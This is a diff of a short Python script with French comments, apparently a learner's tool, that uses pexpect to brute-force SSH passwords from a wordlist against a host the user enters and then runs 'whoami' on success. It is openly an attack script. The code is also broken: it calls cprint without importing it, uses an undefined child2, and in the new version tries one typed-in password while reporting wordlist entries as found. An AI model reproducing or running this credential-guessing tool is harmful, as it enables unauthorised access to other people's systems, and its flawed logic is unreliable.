@@ -1,44 +1,45 @@
-#!usr/bin/python
+#!usr/bin/python3
 
 import pexpect #va nous servir a automatiser le processus de login ssh
 from termcolor import colored
 
-PROMPT = {'# ', '>>> ', '> ', '\$ '] #on s'attend a nous demander ca
+PROMPT = ['# ', '>>> ', '> ', '\$ '] #on s'attend a nous demander ca
+
 def send_command(child, command):
-	child.sendline(command)
+	child.sendline(command) #on envoie la commande a la connection
 	child.expect(PROMPT)
-	print(child.before) #print l'output de la commande executee sur le systeme cible
+	cprint(child.before.decode(), 'yellow') #va print l'output de la command executee sur le systeme cible
 
 def connect(user, host, password):
 	ssh_newkey = 'Are you sure you want to continue connecting' #message qui nous demande une reponse
 	connStr = 'ssh ' + user + '@' + host #equivaut a la commande ssh user@IP
 	child = pexpect.spawn(connStr) #on lance la connection
 	ret  = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
-	if ret == 0: #correspond au timeout
-		print('[-] Error Connecting') #si ca renvoie un 0 c'est qu'on a pas pu se connecter
+	if ret == 0:
+		cprint('[-] Error Connecting', 'red') #si ca renvoie un 0 c'est qu'on a pas pu se connecter
 		return
-	if ret == 1: #correspond au ssh_newkey
+	if ret == 1:
 		child2.sendline('yes') #si ca renvoie un 1 c'est qu'on s'est connnecte, ensuite on veut repondre yes a la question
 		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword '])
 		if ret == 0:
-			print('[-] Error connecting')
+			cprint('[-] Error connecting', 'red')
 			return
 	child.sendline(password)
-	child.expect(PROMPT, timeout=0.5) #sans timeout il a pas le temps de se connecter
+	child.expect(PROMPT)
 	return child #retourne la conncetion SSH
 
 def main():
 	host = input("Enter IP to bruteforce: ")
-	user = input("Enter user you want to bruteforce": )
-	file = open('passwords.txt', 'r') #ficchier contenant les mdp a tester
+	user = input("Enter user you want to bruteforce: ")
+	passworde = input("passworde: ")
+	file = open("passwords.txt", 'r') #fichier contenant les mdp a tester
 	for password in file.readlines():
 		password= password.strip('\n')
 		try:
-			child = connect(user,host,password)
-			print(colored('Password found: '+ password, 'green')
+			child = connect(user,host,passworde)
+			print(colored('Password found: '+ password, 'green'))
 			send_command(child, 'whoami')
 		except:
-			print(colored('[-] Wrong password: ' + password, 'red')
-
+			print(colored('[-] Wrong password: ' + password, 'red'))
 
 main()
